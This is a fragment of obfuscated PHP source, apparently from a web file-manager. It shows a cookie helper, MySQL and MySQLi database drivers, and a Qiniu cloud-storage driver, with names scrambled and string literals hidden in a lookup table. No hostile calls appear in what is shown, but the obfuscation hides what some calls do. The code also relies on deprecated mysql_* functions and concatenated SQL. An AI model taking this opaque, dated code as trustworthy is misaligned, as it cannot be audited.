(isset(self::$sameCookieSet[$Ι·®Ξ—]) && self::$sameCookieSet[$Ι·®Ξ—] == $µρωΧµλ . $®…ΊΡξγ) { return; } self::$sameCookieSet[$Ι·®Ξ—] = $µρωΧµλ . $®…ΊΡξγ; if (!$ύαΜ›±ΰ) { $ύαΜ›±ΰ = str_replace(HOST, $¦κΐΰ»»[12], APP_HOST); $ύαΜ›±ΰ = _get($GLOBALS, $¦κΐΰ»»[969], $ύαΜ›±ΰ); } $λγΫή¥½ = $¦κΐΰ»»[12]; setcookie($Ι·®Ξ—, $µρωΧµλ, time() + $®…ΊΡξγ, $¦κΐΰ»»[8] . trim($ύαΜ›±ΰ, $¦κΐΰ»»[8]) . $λγΫή¥½, !1, !1, $ήµΣΏ¥£); } public static function setSafe($Ο™ν¤θ, $έΰ…ΧΣ, $ƒ­°Ή» = 0) { self::set($Ο™ν¤θ, $έΰ…ΧΣ, $ƒ­°Ή», !0); } public static function get($τϋΫυα¦) { static $ζήΡΔΫ„ = false; if (!$ζήΡΔΫ„) { self::initHeaderCookie(); $ζήΡΔΫ„ = !0; } return isset($_COOKIE[$τϋΫυα¦]) ? $_COOKIE[$τϋΫυα¦] : !1; } private static function initHeaderCookie() { $Γ‡—»Ύ =& $_SERVER[γγάψ½]; if (!isset($_SERVER[$Γ‡—»Ύ[970]]) || !$_SERVER[$Γ‡—»Ύ[970]]) { return; } $γ“ςλφΧ = explode($Γ‡—»Ύ[74], $_SERVER[$Γ‡—»Ύ[970]]); foreach ($γ“ςλφΧ as $Ϊΰβ«ό¥) { $Ϊΰβ«ό¥ = explode($Γ‡—»Ύ[509], $Ϊΰβ«ό¥); if (count($Ϊΰβ«ό¥) != 2 || !isset($Ϊΰβ«ό¥[1])) { continue; } $_COOKIE[trim($Ϊΰβ«ό¥[0])] = trim($Ϊΰβ«ό¥[1]); } } public static function remove($ξασ„ά, $έΪ›»ψ = false) { unset($_COOKIE[$ξασ„ά]); self::set($ξασ„ά, $_SERVER[γγάψ½][12], 1, $έΪ›»ψ); } } class DbMysql extends Db { public function __construct($όΘ™Αό = '') { $‰ή­€χ† =& $_SERVER[γγάψ½]; if (!extension_loaded($‰ή­€χ†[883])) { think_exception(think_lang($‰ή­€χ†[14]) . $‰ή­€χ†[971]); } if (!empty($όΘ™Αό)) { $this->config = $όΘ™Αό; if (empty($this->config[$‰ή­€χ†[17]])) { $this->config[$‰ή­€χ†[17]] = $‰ή­€χ†[12]; } } } public function connect($™”Ηύό = '', $φΙΠωΎ‰ = 0, $²®ε®ήΪ = false) { $ο“½β―  =& $_SERVER[γγάψ½]; if (!isset($this->linkID[$φΙΠωΎ‰])) { if (empty($™”Ηύό)) { $™”Ηύό = $this->config; } $ΑιΌΙΛΎ = $™”Ηύό[$ο“½β― [972]] . ($™”Ηύό[$ο“½β― [973]] ? "\72{$™”Ηύό[$ο“½β― [973]]}" : $ο“½β― [12]); $¤ΰΪϊΖ = !empty($™”Ηύό[$ο“½β― [17]][$ο“½β― [18]]) ? $™”Ηύό[$ο“½β― [17]][$ο“½β― [18]] : $this->pconnect; if ($¤ΰΪϊΖ) { $this->linkID[$φΙΠωΎ‰] = mysql_pconnect($ΑιΌΙΛΎ, $™”Ηύό[$ο“½β― [974]], $™”Ηύό[$ο“½β― [975]], 131072); } else { $this->linkID[$φΙΠωΎ‰] = mysql_connect($ΑιΌΙΛΎ, $™”Ηύό[$ο“½β― [974]], $™”Ηύό[$ο“½β― [975]], !0, 131072); } if (!$this->linkID[$φΙΠωΎ‰] || !empty($™”Ηύό[$ο“½β― [21]]) && !mysql_select_db($™”Ηύό[$ο“½β― [21]], $this->linkID[$φΙΠωΎ‰])) { think_exception(mysql_error()); } $ΐΏ―Εεκ = mysql_get_server_info($this->linkID[$φΙΠωΎ‰]); mysql_query($ο“½β― [976] . think_config($ο“½β― [977]) . $ο“½β― [58], $this->linkID[$φΙΠωΎ‰]); if ($ΐΏ―Εεκ > $ο“½β― [978]) { mysql_query($ο“½β― [979], $this->linkID[$φΙΠωΎ‰]); } $this->connected = !0; if (1 != think_config($ο“½β― [22])) { unset($this->config); } } return $this->linkID[$φΙΠωΎ‰]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($—ΟΐΫΤό) { $ΐΠκ•° =& $_SERVER[γγάψ½]; if (0 === stripos($—ΟΐΫΤό, $ΐΠκ•°[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—ΟΐΫΤό; if ($this->queryID) { $this->free(); } think_action_status($ΐΠκ•°[23], 1); think_status($ΐΠκ•°[24]); $this->queryID = mysql_query($—ΟΐΫΤό, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($σθμ¨Ρ) { $Νΰ‡δ¶‡ =& $_SERVER[γγάψ½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $σθμ¨Ρ; if ($this->queryID) { $this->free(); } think_action_status($Νΰ‡δ¶‡[25], 1); think_status($Νΰ‡δ¶‡[24]); $ιΟςΝ· = mysql_query($σθμ¨Ρ, $this->_linkID); $this->debug(); if (!1 === $ιΟςΝ·) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[γγάψ½][980], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ρ…»ό±— = mysql_query($_SERVER[γγάψ½][981], $this->_linkID); $this->transTimes = 0; if (!$ρ…»ό±—) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ρυμτ = mysql_query($_SERVER[γγάψ½][982], $this->_linkID); $this->transTimes = 0; if (!$ρυμτ) { $this->error(); return !1; } } return !0; } private function getAll() { $ΆΆ›ί»ΐ = array(); if ($this->numRows > 0) { while ($½ΆσΛκΗ = mysql_fetch_assoc($this->queryID)) { $ΆΆ›ί»ΐ[] = $½ΆσΛκΗ; } mysql_data_seek($this->queryID, 0); } return $ΆΆ›ί»ΐ; } public function getFields($· °’°ι) { $Θτ½ΟΙ¦ =& $_SERVER[γγάψ½]; $ΰτΔ·© = $this->query($Θτ½ΟΙ¦[983] . $this->parseKey($· °’°ι)); $‰θΈ§©ξ = array(); if ($ΰτΔ·©) { foreach ($ΰτΔ·© as $½®χ ²‚ => $ΝΪρΠΊ) { $‰θΈ§©ξ[$ΝΪρΠΊ[$Θτ½ΟΙ¦[31]]] = array($Θτ½ΟΙ¦[32] => $ΝΪρΠΊ[$Θτ½ΟΙ¦[31]], $Θτ½ΟΙ¦[33] => $ΝΪρΠΊ[$Θτ½ΟΙ¦[34]], $Θτ½ΟΙ¦[35] => (bool) (strtoupper($ΝΪρΠΊ[$Θτ½ΟΙ¦[36]]) === $Θτ½ΟΙ¦[984]), $Θτ½ΟΙ¦[37] => $ΝΪρΠΊ[$Θτ½ΟΙ¦[38]], $Θτ½ΟΙ¦[39] => strtolower($ΝΪρΠΊ[$Θτ½ΟΙ¦[40]]) == $Θτ½ΟΙ¦[41], $Θτ½ΟΙ¦[42] => strtolower($ΝΪρΠΊ[$Θτ½ΟΙ¦[43]]) == $Θτ½ΟΙ¦[44]); } } return $‰θΈ§©ξ; } public function getTables($­νΏ¨· = '') { $Κ„¬νή =& $_SERVER[γγάψ½]; if (!empty($­νΏ¨·)) { $ξΜ„Δ = $Κ„¬νή[985] . $­νΏ¨· . $Κ„¬νή[986]; } else { $ξΜ„Δ = $Κ„¬νή[987]; } $Σ­λέκ = $this->query($ξΜ„Δ); $ƒΈ»Γ = array(); foreach ($Σ­λέκ as $ΕΩσνϊ‹ => $κ‡©δ) { $ƒΈ»Γ[$ΕΩσνϊ‹] = current($κ‡©δ); } return $ƒΈ»Γ; } public function replace($’θξϋ, $Ψƒ’ατΪ = array()) { $ •ΣΛΆ =& $_SERVER[γγάψ½]; foreach ($’θξϋ as $¤δ―Ι€› => $άΏΉΆ™β) { $±¨οΌ°€ = $this->parseValue($άΏΉΆ™β); if (is_scalar($±¨οΌ°€)) { $μΚΘ †[] = $±¨οΌ°€; $²ΟΤΣΣ[] = $this->parseKey($¤δ―Ι€›); } } $ψίΜΰό‘ = $ •ΣΛΆ[988] . $this->parseTable($Ψƒ’ατΪ[$ •ΣΛΆ[359]]) . $ •ΣΛΆ[989] . implode($ •ΣΛΆ[50], $²ΟΤΣΣ) . $ •ΣΛΆ[990] . implode($ •ΣΛΆ[50], $μΚΘ †) . $ •ΣΛΆ[991]; return $this->execute($ψίΜΰό‘); } public function insertAll($“ί‚¶ϋ, $Γυόν = array(), $ήΕΌ’ = false) { $ΘάΫΫ =& $_SERVER[γγάψ½]; if (!is_array($“ί‚¶ϋ[0])) { return !1; } $―σ•α¨ = array_keys($“ί‚¶ϋ[0]); $Λ‰†Ώ§ = array(); foreach ($“ί‚¶ϋ as $©„λ‹€ΰ) { $…μΧΏΝ† = array(); foreach ($©„λ‹€ΰ as $‚΅μΞυ => $ΈΠΜ¤ή) { $ΈΠΜ¤ή = $this->parseValue($ΈΠΜ¤ή); if (is_scalar($ΈΠΜ¤ή)) { $…μΧΏΝ†[] = $ΈΠΜ¤ή; } } $Λ‰†Ώ§[] = $ΘάΫΫ[340] . implode($ΘάΫΫ[50], $…μΧΏΝ†) . $ΘάΫΫ[991]; } array_walk($―σ•α¨, array($this, $ΘάΫΫ[992])); $ΟΞν£§υ = ($ήΕΌ’ ? $ΘάΫΫ[993] : $ΘάΫΫ[994]) . $ΘάΫΫ[995] . $this->parseTable($Γυόν[$ΘάΫΫ[359]]) . $ΘάΫΫ[989] . implode($ΘάΫΫ[50], $―σ•α¨) . $ΘάΫΫ[996] . implode($ΘάΫΫ[50], $Λ‰†Ώ§); return $this->execute($ΟΞν£§υ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $σΣ–•Υ =& $_SERVER[γγάψ½]; $this->error = mysql_errno() . $σΣ–•Υ[4] . mysql_error($this->_linkID); if ($σΣ–•Υ[12] != $this->queryStr) { $this->error .= LNG($σΣ–•Υ[48]) . $this->queryStr; } think_trace($this->error, $σΣ–•Υ[12], $σΣ–•Υ[49]); return $this->error; } public function escapeString($ί—ε©Ά) { if ($this->_linkID) { return mysql_real_escape_string($ί—ε©Ά, $this->_linkID); } else { return mysql_escape_string($ί—ε©Ά); } } public function parseKey(&$άΛΎ“Τ, $ψ΄ΦΝμμ = true) { $¨—τΠω =& $_SERVER[γγάψ½]; if ($ψ΄ΦΝμμ) { $άΛΎ“Τ = $this->parseKeyCheck($άΛΎ“Τ); } if ($άΛΎ“Τ != $¨—τΠω[223] && !preg_match($¨—τΠω[997], $άΛΎ“Τ)) { $άΛΎ“Τ = $¨—τΠω[464] . trim($άΛΎ“Τ, $¨—τΠω[464]) . $¨—τΠω[464]; } return $άΛΎ“Τ; } } class DbMysqli extends Db { public function __construct($¬όίΡΚ = '') { $ΐΎΩί½ϊ =& $_SERVER[γγάψ½]; if (!extension_loaded($ΐΎΩί½ϊ[998])) { think_exception(think_lang($ΐΎΩί½ϊ[14]) . $ΐΎΩί½ϊ[999]); } if (!empty($¬όίΡΚ)) { $this->config = $¬όίΡΚ; if (empty($this->config[$ΐΎΩί½ϊ[17]])) { $this->config[$ΐΎΩί½ϊ[17]] = $ΐΎΩί½ϊ[12]; } } } public function connect($Χα΄—¤ = '', $¥δΟ¶ΐ = 0) { $ύχΒΫρ =& $_SERVER[γγάψ½]; if (!isset($this->linkID[$¥δΟ¶ΐ])) { if (empty($Χα΄—¤)) { $Χα΄—¤ = $this->config; } $this->linkID[$¥δΟ¶ΐ] = new mysqli($Χα΄—¤[$ύχΒΫρ[972]], $Χα΄—¤[$ύχΒΫρ[974]], $Χα΄—¤[$ύχΒΫρ[975]], $Χα΄—¤[$ύχΒΫρ[21]], $Χα΄—¤[$ύχΒΫρ[973]] ? intval($Χα΄—¤[$ύχΒΫρ[973]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $άΥΎχ‹ε = $this->linkID[$¥δΟ¶ΐ]->server_version; $this->linkID[$¥δΟ¶ΐ]->query($ύχΒΫρ[976] . think_config($ύχΒΫρ[977]) . $ύχΒΫρ[58]); if ($άΥΎχ‹ε > $ύχΒΫρ[978]) { $this->linkID[$¥δΟ¶ΐ]->query($ύχΒΫρ[979]); } $this->connected = !0; if (1 != think_config($ύχΒΫρ[22])) { unset($this->config); } } return $this->linkID[$¥δΟ¶ΐ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($φΠά€ζ‘) { $ύ©Ζ•©” =& $_SERVER[γγάψ½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $φΠά€ζ‘; if ($this->queryID) { $this->free(); } think_action_status($ύ©Ζ•©”[23], 1); think_status($ύ©Ζ•©”[24]); $this->queryID = $this->_linkID->query($φΠά€ζ‘); if ($this->_linkID->more_results()) { while (($Υρ¤ΤΪΨ = $this->_linkID->next_result()) != NULL) { $Υρ¤ΤΪΨ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($χ΄λΚκ) { $›ώΟΠΘ™ =& $_SERVER[γγάψ½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $χ΄λΚκ; if ($this->queryID) { $this->free(); } think_action_status($›ώΟΠΘ™[25], 1); think_status($›ώΟΠΘ™[24]); $§ώέΉΛύ = $this->_linkID->query($χ΄λΚκ); $this->debug(); if (!1 === $§ώέΉΛύ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $φΩάψ€ά = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$φΩάψ€ά) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Γ€ΐ§® = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Γ€ΐ§®) { $this->error(); return !1; } } return !0; } private function getAll() { $ψ­ιθά = array(); if ($this->numRows > 0) { for ($™Ά›ΰΆ = 0; $™Ά›ΰΆ < $this->numRows; $™Ά›ΰΆ++) { $ψ­ιθά[$™Ά›ΰΆ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ψ­ιθά; } public function getFields($φΙ¥ΏΖδ) { $Λ‡«΅ξε =& $_SERVER[γγάψ½]; $ΰΣ ΚΘ = $this->query($Λ‡«΅ξε[983] . $this->parseKey($φΙ¥ΏΖδ)); $™ϋΖΓθ = array(); if ($ΰΣ ΚΘ) { foreach ($ΰΣ ΚΘ as $ώ‹Ι±¬¶ => $λ³«…) { $™ϋΖΓθ[$λ³«…[$Λ‡«΅ξε[31]]] = array($Λ‡«΅ξε[32] => $λ³«…[$Λ‡«΅ξε[31]], $Λ‡«΅ξε[33] => $λ³«…[$Λ‡«΅ξε[34]], $Λ‡«΅ξε[35] => (bool) ($λ³«…[$Λ‡«΅ξε[36]] === $Λ‡«΅ξε[12]), $Λ‡«΅ξε[37] => $λ³«…[$Λ‡«΅ξε[38]], $Λ‡«΅ξε[39] => strtolower($λ³«…[$Λ‡«΅ξε[40]]) == $Λ‡«΅ξε[41], $Λ‡«΅ξε[42] => strtolower($λ³«…[$Λ‡«΅ξε[43]]) == $Λ‡«΅ξε[44]); } } return $™ϋΖΓθ; } public function getTables($ΜΦ°Ραϊ = '') { $‡ΩιήΑ‚ =& $_SERVER[γγάψ½]; $™βΫι± = !empty($ΜΦ°Ραϊ) ? $‡ΩιήΑ‚[985] . $ΜΦ°Ραϊ . $‡ΩιήΑ‚[986] : $‡ΩιήΑ‚[987]; $Η‘­ό€ = $this->query($™βΫι±); $ΧφΜ² = array(); if ($Η‘­ό€) { foreach ($Η‘­ό€ as $Τ¥Σγ™ => $–θΡω•Φ) { $ΧφΜ²[$Τ¥Σγ™] = current($–θΡω•Φ); } } return $ΧφΜ²; } public function replace($λ•›οµΚ, $θ«¤―β = array()) { $γ§Ψ’³σ =& $_SERVER[γγάψ½]; foreach ($λ•›οµΚ as $όσ…΄σ => $•ΞνΧ‘µ) { $Ρωι·θ = $this->parseValue($•ΞνΧ‘µ); if (is_scalar($Ρωι·θ)) { $σΞύΕύβ[] = $Ρωι·θ; $«η‹΄²€[] = $this->parseKey($όσ…΄σ); } } $ƒζ®¶ = $γ§Ψ’³σ[988] . $this->parseTable($θ«¤―β[$γ§Ψ’³σ[359]]) . $γ§Ψ’³σ[989] . implode($γ§Ψ’³σ[50], $«η‹΄²€) . $γ§Ψ’³σ[990] . implode($γ§Ψ’³σ[50], $σΞύΕύβ) . $γ§Ψ’³σ[991]; return $this->execute($ƒζ®¶); } public function insertAll($©πς¦η, $®²Ξ†ί = array(), $ΐα·ςΐϊ = false) { $‡Σλ™± =& $_SERVER[γγάψ½]; if (!is_array($©πς¦η[0])) { return !1; } $Ό­€™Ϋ— = array_keys($©πς¦η[0]); $‚•Γΰ΅ = array(); foreach ($©πς¦η as $ςΚΧ©®) { $Ζκ‹ϋ… = array(); foreach ($ςΚΧ©® as $Ϋ·γ²­ => $Β‹£ Γρ) { $Β‹£ Γρ = $this->parseValue($Β‹£ Γρ); if (is_scalar($Β‹£ Γρ)) { $Ζκ‹ϋ…[] = $Β‹£ Γρ; } } $‚•Γΰ΅[] = $‡Σλ™±[340] . implode($‡Σλ™±[50], $Ζκ‹ϋ…) . $‡Σλ™±[991]; } array_walk($Ό­€™Ϋ—, array($this, $‡Σλ™±[992])); $…μ¨«›υ = $ΐα·ςΐϊ ? $‡Σλ™±[993] : $‡Σλ™±[994]; $ξο¦·Η = $…μ¨«›υ . $‡Σλ™±[995] . $this->parseTable($®²Ξ†ί[$‡Σλ™±[359]]) . $‡Σλ™±[989] . implode($‡Σλ™±[50], $Ό­€™Ϋ—) . $‡Σλ™±[996] . implode($‡Σλ™±[50], $‚•Γΰ΅); return $this->execute($ξο¦·Η); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ι®™³ =& $_SERVER[γγάψ½]; $this->error = $this->_linkID->errno . $ι®™³[4] . $this->_linkID->error; if ($ι®™³[12] != $this->queryStr) { $this->error .= LNG($ι®™³[48]) . $this->queryStr; } think_trace($this->error, $ι®™³[12], $ι®™³[49]); return $this->error; } public function escapeString($ρ΅ΑΞύµ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ρ΅ΑΞύµ); } else { return addslashes($ρ΅ΑΞύµ); } } public function parseKey(&$ƒυΑ€ Ν, $‡Κϋ‡¤ύ = true) { $ΒƒΚ¬ΔΕ =& $_SERVER[γγάψ½]; if ($‡Κϋ‡¤ύ) { $ƒυΑ€ Ν = $this->parseKeyCheck($ƒυΑ€ Ν); } if ($ƒυΑ€ Ν != $ΒƒΚ¬ΔΕ[223] && !preg_match($ΒƒΚ¬ΔΕ[997], $ƒυΑ€ Ν)) { $ƒυΑ€ Ν = $ΒƒΚ¬ΔΕ[464] . trim($ƒυΑ€ Ν, $ΒƒΚ¬ΔΕ[464]) . $ΒƒΚ¬ΔΕ[464]; } return $ƒυΑ€ Ν; } } goto BΌΠΧνΚ›; E‚©ίβΧ›Λ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($„μ΅­¤΄) { parent::__construct(); require_once SDK_DIR . $_SERVER[γγάψ½][1546]; $this->_init($„μ΅­¤΄); } public function _init($³ΪφΤΔξ) { $ΘΧΣ§ =& $_SERVER[γγάψ½]; $this->config = $³ΪφΤΔξ; foreach ($³ΪφΤΔξ as $³·ΡΞµ => $κγ£ωγ¤) { if (isset($this->{$³·ΡΞµ})) { $this->{$³·ΡΞµ} = $κγ£ωγ¤; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ΘΧΣ§[1547] . LNG($ΘΧΣ§[1483])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ϋτΡΕΆα, $ΨΤΆƒβσ = '', $Έ¥ψτψ = REPEAT_RENAME) { if ($this->setContent($ϋτΡΕΆα, $ΨΤΆƒβσ)) { return $this->getPathOuter($ϋτΡΕΆα); } return !1; } public function mkdir($―Μ”ψά™, $±ε‰Ε•‰ = REPEAT_SKIP) { $ΆΏ³ =& $_SERVER[γγάψ½]; $φΔ‰ι = trim($―Μ”ψά™, $ΆΏ³[8]); if ($this->_isFolder($φΔ‰ι)) { return $this->getPathOuter($φΔ‰ι); } $―Μ”ψά™ = $φΔ‰ι . $ΆΏ³[8]; $°ηΚϋγξ = get_path_this($φΔ‰ι); $’εμ…Ό = $―Μ”ψά™ . $°ηΚϋγξ; if (!$this->mkfile($’εμ…Ό)) { return !1; } if (!$this->moveFile($’εμ…Ό, $―Μ”ψά™)) { $this->delFile($’εμ…Ό); return !1; } return $this->getPathOuter($φΔ‰ι); } public function copyFile($―Κµδ, $θΘο¶‰Ξ) { $ΑοΕαάΗ = $this->bucketManager->copy($this->bucket, $―Κµδ, $this->bucket, $θΘο¶‰Ξ, !0); return $ΑοΕαάΗ ? !1 : $this->getPathOuter($θΘο¶‰Ξ); } public function moveFile($ΰΝ΅ο‡, $ΟΪ­θζΆ) { $νλ¤ήκ• = $this->bucketManager->move($this->bucket, $ΰΝ΅ο‡, $this->bucket, $ΟΪ­θζΆ, !0); return $νλ¤ήκ• ? !1 : $this->getPathOuter($ΟΪ­θζΆ); } public function delFile($°θρ¤ε¨) { if (!$this->exist($°θρ¤ε¨)) { return !0; } $³ΐα±Ήκ = $this->bucketManager->delete($this->bucket, $°θρ¤ε¨); if (!$³ΐα±Ήκ) { return !0; } return $³ΐα±Ήκ->code() == 612 ? !0 : !1; } public function delFolder($ϋΨσΔΡΒ) { $ΣϊΡ¨ψ =& $_SERVER[γγάψ½]; if (!$this->exist($ϋΨσΔΡΒ)) { return !0; } $this->listItemCache = !1; $ΙΦ‡ΔΎΩ = $this->fileList($ϋΨσΔΡΒ); $this->listItemCache = !0; $΅―³—ι« = trim($ϋΨσΔΡΒ, $ΣϊΡ¨ψ[8]) . $ΣϊΡ¨ψ[8]; if (!empty($ϋΨσΔΡΒ) && $ϋΨσΔΡΒ !== $ΣϊΡ¨ψ[231] && !in_array($΅―³—ι«, $ΙΦ‡ΔΎΩ[$ΣϊΡ¨ψ[85]])) { $ΙΦ‡ΔΎΩ[$ΣϊΡ¨ψ[85]][] = $΅―³—ι«; } $®Ή•κ™ = $this->delByBatch($ΙΦ‡ΔΎΩ[$ΣϊΡ¨ψ[86]]); if (!$®Ή•κ™) { return !1; } $®Ή•κ™ = $this->delByBatch($ΙΦ‡ΔΎΩ[$ΣϊΡ¨ψ[85]]); if (!$®Ή•κ™) { return !1; } return $this->delFile($΅―³—ι«); } private function delByBatch($ιΉ‡ωΘ) { foreach (array_chunk($ιΉ‡ωΘ, 1000) as $ζΩΦ·‘) { $ΐκω’ς• = $this->bucketManager->buildBatchDelete($this->bucket, $ζΩΦ·‘); list($Ψιώι¨, $άλ„ϊΒ) = $this->bucketManager->batch($ΐκω’ς•); if ($άλ„ϊΒ) { return !1; } } return !0; } public function rename($σ°…‚£ς, $†™¬‰) { return $this->renameObject($σ°…‚£ς, $†™¬‰); } public function fileInfo($ΗψΦ°°½, $Πκς‘π† = false, $­ΧΑƒΧΣ = array()) { $―·Φ‚¶“ =& $_SERVER[γγάψ½]; $ίΰ„¥Υ = array($―·Φ‚¶“[32] => $this->pathThis($ΗψΦ°°½), $―·Φ‚¶“[87] => $this->getPathOuter($―·Φ‚¶“[8] . $ΗψΦ°°½), $―·Φ‚¶“[33] => $―·Φ‚¶“[233], $―·Φ‚¶“[79] => isset($­ΧΑƒΧΣ[$―·Φ‚¶“[1548]]) ? $­ΧΑƒΧΣ[$―·Φ‚¶“[1548]] : 0, $―·Φ‚¶“[169] => $this->ext($ΗψΦ°°½)); if ($Πκς‘π†) { return $ίΰ„¥Υ; } $ίΰ„¥Υ[$―·Φ‚¶“[234]] = $ίΰ„¥Υ[$―·Φ‚¶“[88]] = 0; $ίΰ„¥Υ[$―·Φ‚¶“[235]] = $ίΰ„¥Υ[$―·Φ‚¶“[236]] = !0; if (empty($­ΧΑƒΧΣ)) { $­ΧΑƒΧΣ = $this->objectMeta($ΗψΦ°°½); if (!$­ΧΑƒΧΣ) { return $ίΰ„¥Υ; } } if (isset($­ΧΑƒΧΣ[$―·Φ‚¶“[237]]) && $­ΧΑƒΧΣ[$―·Φ‚¶“[237]]) { $ίΰ„¥Υ[$―·Φ‚¶“[238]] = $­ΧΑƒΧΣ[$―·Φ‚¶“[237]]; } if (isset($­ΧΑƒΧΣ[$―·Φ‚¶“[248]]) && $­ΧΑƒΧΣ[$―·Φ‚¶“[248]]) { $ίΰ„¥Υ[$―·Φ‚¶“[238]] = $­ΧΑƒΧΣ[$―·Φ‚¶“[248]]; } if (isset($­ΧΑƒΧΣ[$―·Φ‚¶“[1549]])) { $ίΰ„¥Υ[$―·Φ‚¶“[88]] = substr($­ΧΑƒΧΣ[$―·Φ‚¶“[1549]] . $―·Φ‚¶“[12], 0, 10); } if (isset($­ΧΑƒΧΣ[$―·Φ‚¶“[1548]])) { $ίΰ„¥Υ[$―·Φ‚¶“[79]] = $­ΧΑƒΧΣ[$―·Φ‚¶“[1548]]; } return $ίΰ„¥Υ; } public function folderInfo($ΕΫΉ—Ζ³, $ίυΜΆΆ = false) { $ΛΙλ―½ί =& $_SERVER[γγάψ½]; $χ†ΠΕ  = array($ΛΙλ―½ί[32] => $this->pathThis($ΕΫΉ—Ζ³), $ΛΙλ―½ί[87] => $this->getPathOuter($ΛΙλ―½ί[8] . $ΕΫΉ—Ζ³), $ΛΙλ―½ί[33] => $ΛΙλ―½ί[78]); if ($ίυΜΆΆ) { return $χ†ΠΕ ; } $χ†ΠΕ [$ΛΙλ―½ί[234]] = $χ†ΠΕ [$ΛΙλ―½ί[88]] = 0; $χ†ΠΕ [$ΛΙλ―½ί[235]] = $χ†ΠΕ [$ΛΙλ―½ί[236]] = !0; $ΕΫΉ—Ζ³ = rtrim($ΕΫΉ—Ζ³, $ΛΙλ―½ί[8]) . $ΛΙλ―½ί[8]; $ι’γ›΄γ = $this->objectMeta($ΕΫΉ—Ζ³); if (isset($ι’γ›΄γ[$ΛΙλ―½ί[1549]])) { $χ†ΠΕ [$ΛΙλ―½ί[88]] = substr($ι’γ›΄γ[$ΛΙλ―½ί[1549]] . $ΛΙλ―½ί[12], 0, 10); } return $χ†ΠΕ ; } public function listPath($φΆΫ•, $¤¦¦ϊΚ = false) { $ΛΛπϊ =& $_SERVER[γγάψ½]; $ύολ’ = $this->fileList($φΆΫ•, $ΛΛπϊ[8], !0); foreach ($ύολ’[$ΛΛπϊ[85]] as $ΣήΧδ΄ => $΄‡ƒΒύ) { $ύολ’[$ΛΛπϊ[85]][$ΣήΧδ΄] = $this->folderInfo($΄‡ƒΒύ, $¤¦¦ϊΚ); } foreach ($ύολ’[$ΛΛπϊ[86]] as $ΣήΧδ΄ => $΄‡ƒΒύ) { $ύολ’[$ΛΛπϊ[86]][$ΣήΧδ΄] = $this->fileInfo($΄‡ƒΒύ[$ΛΛπϊ[32]], $¤¦¦ϊΚ, $΄‡ƒΒύ); } return $ύολ’; } public function has($ΛΕαΦΤι, $ΨΨΪβχΙ = false, $ƒξΙφ = true) { $¶η¥ΙΏ =& $_SERVER[γγάψ½]; $ΛΕαΦΤι = trim($ΛΕαΦΤι, $¶η¥ΙΏ[8]); $²Κ«™όή = empty($ΛΕαΦΤι) && $ΛΕαΦΤι !== $¶η¥ΙΏ[231] ? $¶η¥ΙΏ[12] : $ΛΕαΦΤι . $¶η¥ΙΏ[8]; $¥άΙ»σ = $¶η¥ΙΏ[12]; $‹“®βψ£ = 500; $Ύε·ό“Β = $¶η¥ΙΏ[8]; $¬Ξ†τηΌ = $ήΉ ΣΨ = 0; while (!0) { check_abort(); list($‹•ΥΏγ, $α’£ΩΖ¦) = $this->bucketManager->listFiles($this->bucket, $²Κ«™όή, $¥άΙ»σ, $‹“®βψ£, $Ύε·ό“Β); if ($α’£ΩΖ¦) { break; } $¥άΙ»σ = array_key_exists($¶η¥ΙΏ[1495], $‹•ΥΏγ) ? $¥άΙ»σ = $‹•ΥΏγ[$¶η¥ΙΏ[1550]] : $¶η¥ΙΏ[12]; if ($ΨΨΪβχΙ) { if (!empty($‹•ΥΏγ[$¶η¥ΙΏ[1551]])) { $¬Ξ†τηΌ += count($‹•ΥΏγ[$¶η¥ΙΏ[1551]]); } if (!empty($‹•ΥΏγ[$¶η¥ΙΏ[1552]])) { $ήΉ ΣΨ += count($‹•ΥΏγ[$¶η¥ΙΏ[1552]]); } if ($¥άΙ»σ === $¶η¥ΙΏ[12]) { break; } continue; } if ($ƒξΙφ) { if 